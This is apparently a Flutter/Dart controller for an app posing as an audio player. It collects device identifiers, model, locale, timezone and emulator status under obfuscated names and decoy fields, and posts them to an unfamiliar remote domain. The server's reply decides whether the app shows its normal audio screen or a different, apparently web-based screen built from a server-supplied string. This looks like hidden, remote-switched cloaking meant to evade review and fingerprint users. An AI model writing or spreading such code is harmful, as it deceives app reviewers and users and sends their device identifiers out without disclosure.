import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void jasghih() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/restart");
  }
}

class PageLogic extends GetxController {
  var cinepafj = RxBool(false);
  var zqafjgm = RxBool(true);
  var cwmaxkvj = RxString("");
  var jude = RxBool(false);
  var legros = RxBool(true);
  final vwpnaftjr = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    jasghih();
    super.onInit();
    tsqg();
  }


  Future<void> tsqg() async {

    jude.value = true;
    legros.value = true;
    zqafjgm.value = false;

    vwpnaftjr.post("https://wo.gbondxu.xyz/yKkERBQPg",data: await telskdbr()).then((value) {
      var jxwhe = value.data["jxwhe"] as String;
      var alqjxf = value.data["alqjxf"] as bool;
      if (alqjxf) {
        cwmaxkvj.value = jxwhe;
        grace();
      } else {
        breitenberg();
      }
    }).catchError((e) {
      zqafjgm.value = true;
      legros.value = true;
      jude.value = false;
    });
  }

  Future<Map<String, dynamic>> telskdbr() async {
    final DeviceInfoPlugin hnymrstl = DeviceInfoPlugin();
    PackageInfo ohgjzslw_hanowjpu = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var nroq = Platform.localeName;
    var QFIOap = currentTimeZone;

    var KiwLWmX = ohgjzslw_hanowjpu.packageName;
    var FiPQIeu = ohgjzslw_hanowjpu.version;
    var ltfwVFTo = ohgjzslw_hanowjpu.buildNumber;

    var WgYfFTRU = ohgjzslw_hanowjpu.appName;
    var thGA = "";
    var YpKGEBz  = "";
    var nCHMBke = "";
    var keyshawnProhaska = "";
    var camrenStehr = "";
    var bethHalvorson = "";
    var glennieDach = "";
    var paxtonRunolfsdottir = "";
    var ashlyHane = "";


    var pCtI = "";
    var Bgoysuzb = false;

    if (GetPlatform.isAndroid) {
      pCtI = "android";
      var eypvordgfq = await hnymrstl.androidInfo;

      nCHMBke = eypvordgfq.brand;

      thGA  = eypvordgfq.model;
      YpKGEBz = eypvordgfq.id;

      Bgoysuzb = eypvordgfq.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      pCtI = "ios";
      var caowlyzje = await hnymrstl.iosInfo;
      nCHMBke = caowlyzje.name;
      thGA = caowlyzje.model;

      YpKGEBz = caowlyzje.identifierForVendor ?? "";
      Bgoysuzb  = caowlyzje.isPhysicalDevice;
    }
    var res = {
      "WgYfFTRU": WgYfFTRU,
      "ltfwVFTo": ltfwVFTo,
      "camrenStehr" : camrenStehr,
      "KiwLWmX": KiwLWmX,
      "thGA": thGA,
      "QFIOap": QFIOap,
      "paxtonRunolfsdottir" : paxtonRunolfsdottir,
      "nCHMBke": nCHMBke,
      "YpKGEBz": YpKGEBz,
      "nroq": nroq,
      "pCtI": pCtI,
      "Bgoysuzb": Bgoysuzb,
      "keyshawnProhaska" : keyshawnProhaska,
      "FiPQIeu": FiPQIeu,
      "bethHalvorson" : bethHalvorson,
      "glennieDach" : glennieDach,
      "ashlyHane" : ashlyHane,

    };
    return res;
  }

  Future<void> breitenberg() async {
    Get.offAllNamed("/audio_main");
  }

  Future<void> grace() async {
    Get.offAllNamed("/audio_build");
  }

}
